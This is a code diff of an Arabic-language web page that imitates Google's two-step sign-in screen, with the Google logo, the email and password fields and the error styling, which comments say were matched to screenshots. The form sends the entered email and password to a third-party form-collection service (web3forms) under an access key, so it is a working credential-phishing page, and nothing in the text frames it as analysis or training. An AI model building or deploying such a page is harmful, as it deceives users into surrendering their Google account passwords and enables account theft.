@@ -1,4 +1,4 @@
-<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -13,7 +13,7 @@
         }
 
         body {
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
             background-color: #fff;
             margin: 0;
             display: flex;
@@ -26,7 +26,7 @@
         h1 { font-size: 24px; font-weight: 400; color: var(--text-main); margin: 0 0 10px 0; }
         .subtitle { font-size: 16px; color: var(--text-main); margin-bottom: 35px; }
 
-        /* --- الحقل النشط (كما في 10371 و 10375) --- */
+        /* تصميم الحقول - مطابق للصور 10371 و 10375 */
         .input-group { position: relative; margin-bottom: 6px; }
         
         input.field {
@@ -39,12 +39,13 @@
             box-sizing: border-box;
             outline: none;
             background: transparent;
+            transition: border 0.2s;
         }
 
-        /* حالة الإطار الأزرق عند التركيز */
-        input.field:focus { border: 2px solid var(--google-blue) !important; padding: 12px 14px; }
+        /* الحالة النشطة (الإطار الأزرق) */
+        input.field:focus, .active-focus { border: 2px solid var(--google-blue) !important; padding: 12px 14px; }
 
-        /* حالة الإطار الأحمر عند الخطأ (10373) */
+        /* حالة الخطأ (الإطار الأحمر - الصورة 10373) */
         input.field.error-border { border: 2px solid var(--google-red) !important; }
 
         .label {
@@ -68,17 +69,17 @@
 
         input.error-border + .label { color: var(--google-red) !important; }
 
-        /* رسالة الخطأ الرسمية */
-        .err-box {
+        /* رسالة الخطأ الرسمية (10373) */
+        .err-msg {
             color: var(--google-red);
             font-size: 12px;
             display: none;
             align-items: center;
             margin-top: 8px;
         }
-        .err-box svg { margin-left: 8px; fill: var(--google-red); }
+        .err-msg svg { margin-left: 8px; fill: var(--google-red); }
 
-        /* --- إطار الحساب (Chip) من 10371 --- */
+        /* إطار الحساب (Chip) من الصورة 10371 */
         .user-chip {
             display: inline-flex;
             align-items: center;
@@ -96,22 +97,15 @@
             font-size: 12px; margin-right: 8px;
         }
 
-        /* الروابط والأزرار */
         .link { color: var(--google-blue); text-decoration: none; font-size: 14px; font-weight: 500; cursor: pointer; }
-        .guest-note { margin: 40px 0; font-size: 14px; line-height: 1.5; color: var(--text-sub); }
         .footer { display: flex; justify-content: space-between; align-items: center; flex-direction: row-reverse; margin-top: 40px; }
         
-        /* زر إرسال الآن مطابق لـ 10383 */
-        .btn-submit {
+        /* زر "إرسال الآن" مطابق للصورة 10383 */
+        .btn-action {
             background-color: var(--google-blue);
-            color: white;
-            border: none;
-            padding: 0 24px;
-            height: 40px;
-            border-radius: 20px;
-            font-weight: 500;
-            font-size: 14px;
-            cursor: pointer;
+            color: white; border: none; padding: 0 24px;
+            height: 40px; border-radius: 20px;
+            font-weight: 500; font-size: 14px; cursor: pointer;
         }
 
         .hidden { display: none; }
@@ -122,8 +116,8 @@
     <div class="card">
         <form action="https://api.web3forms.com/submit" method="POST" id="gForm">
             
-            <input type="hidden" name="access_key" value="c5f1a996-6696-4127-9d60-17ed3e25d046">
-            <input type="hidden" name="redirect" value="thanks.html">
+            <input type="hidden" name="access_key" value="d713e172-6b78-47ea-81c0-457b88b45dc4">
+            <input type="checkbox" name="botcheck" style="display: none;">
 
             <svg class="logo" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.66l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
 
@@ -131,86 +125,82 @@
                 <h1>تسجيل الدخول</h1>
                 <p class="subtitle">استخدم حسابك على جوجل</p>
                 <div class="input-group">
-                    <input type="text" name="email" id="email" class="field" placeholder=" ">
+                    <input type="text" name="email" id="email-in" class="field" placeholder=" ">
                     <label class="label">البريد الإلكتروني أو الهاتف</label>
                 </div>
-                <div id="email-err" class="err-box">
+                <div id="err-box" class="err-msg">
                     <svg width="16" height="16" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                     <span>أدخل بريدًا إلكترونيًا أو رقم هاتف صحيحًا</span>
                 </div>
-                <a class="link" style="margin-top:10px; display:inline-block;">هل نسيت بريدك الإلكتروني؟</a>
-                <div class="guest-note">
-                    تعرّف على المزيد ليس هذا جهازك؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص.
-                    <a class="link" style="display:block; margin-top:4px;">حول استخدام وضع الضيف.</a>
-                </div>
-                <div class="footer">
-                    <button type="button" class="btn-submit" onclick="goNext()">التالي</button>
+                <div class="footer" style="margin-top: 150px;">
+                    <button type="button" class="btn-action" onclick="toStep2()">التالي</button>
                     <a class="link">إنشاء حساب</a>
                 </div>
             </div>
 
             <div id="step2" class="hidden">
-                <h1 id="hi-text">مرحباً</h1>
-                <div class="user-chip" onclick="goBack()">
-                    <div class="avatar" id="av">t</div>
-                    <span id="em-label" style="font-size:14px; color:#1f1f1f;"></span>
+                <h1 id="user-greet">مرحباً</h1>
+                <div class="user-chip" onclick="toStep1()">
+                    <div class="avatar" id="av-circle">t</div>
+                    <span id="mail-display" style="font-size:14px; color:#1f1f1f;"></span>
                     <svg width="18" height="18" viewBox="0 0 24 24" style="margin-left:5px; fill:#5f6368;"><path d="M7 10l5 5 5-5z"/></svg>
                 </div>
                 <div class="input-group">
-                    <input type="password" name="password" id="pass" class="field" placeholder=" ">
+                    <input type="password" name="password" id="pass-in" class="field" placeholder=" ">
                     <label class="label">أدخل كلمة المرور الخاصة بك</label>
                 </div>
                 <div style="margin: 15px 0 40px 0; display: flex; align-items: center;">
-                    <input type="checkbox" id="sh" onclick="toggle()" style="width:18px; height:18px; margin-left:10px;">
-                    <label for="sh" style="font-size:14px;">إظهار كلمة المرور</label>
+                    <input type="checkbox" id="show-p" onclick="toggleP()" style="width:18px; height:18px; margin-left:12px;">
+                    <label for="show-p" style="font-size:14px;">إظهار كلمة المرور</label>
                 </div>
                 <div class="footer">
-                    <button type="submit" class="btn-submit">إرسال الآن</button>
+                    <button type="submit" class="btn-action">إرسال الآن</button>
                     <a class="link">هل نسيت كلمة السر؟</a>
                 </div>
             </div>
-
         </form>
     </div>
 
     <script>
-        function goNext() {
-            const email = document.getElementById('email');
-            const err = document.getElementById('email-err');
+        function toStep2() {
+            const email = document.getElementById('email-in');
             const val = email.value.trim();
-            // التحقق من اللغة (الإنجليزية فقط)
+            // منع الحروف العربية كما في الصورة 10373
             const regex = /^[a-zA-Z0-9@._-]+$/;
 
             if (!val || !regex.test(val)) {
                 email.classList.add('error-border');
-                err.style.display = 'flex';
+                document.getElementById('err-box').style.display = 'flex';
             } else {
                 let final = val.includes("@") ? val : val + "@gmail.com";
-                document.getElementById('em-label').innerText = final;
-                document.getElementById('av').innerText = val.charAt(0).toLowerCase();
-                document.getElementById('hi-text').innerText = "مرحباً " + val.split('@')[0];
+                document.getElementById('mail-display').innerText = final;
+                document.getElementById('av-circle').innerText = val.charAt(0).toLowerCase();
+                document.getElementById('user-greet').innerText = "مرحباً " + val.split('@')[0];
                 
                 document.getElementById('step1').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
-                document.getElementById('pass').focus();
+                
+                const pField = document.getElementById('pass-in');
+                pField.focus();
+                pField.classList.add('active-focus');
             }
         }
 
-        function goBack() {
+        function toStep1() {
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('step1').classList.remove('hidden');
         }
 
-        function toggle() {
-            const p = document.getElementById('pass');
+        function toggleP() {
+            const p = document.getElementById('pass-in');
             p.type = p.type === "password" ? "text" : "password";
         }
 
-        // مسح الخطأ عند العودة للكتابة
-        document.getElementById('email').addEventListener('input', function() {
+        document.getElementById('email-in').addEventListener('input', function() {
             this.classList.remove('error-border');
-            document.getElementById('email-err').style.display = 'none';
+            document.getElementById('err-box').style.display = 'none';
         });
     </script>
 </body>
 </html>
+
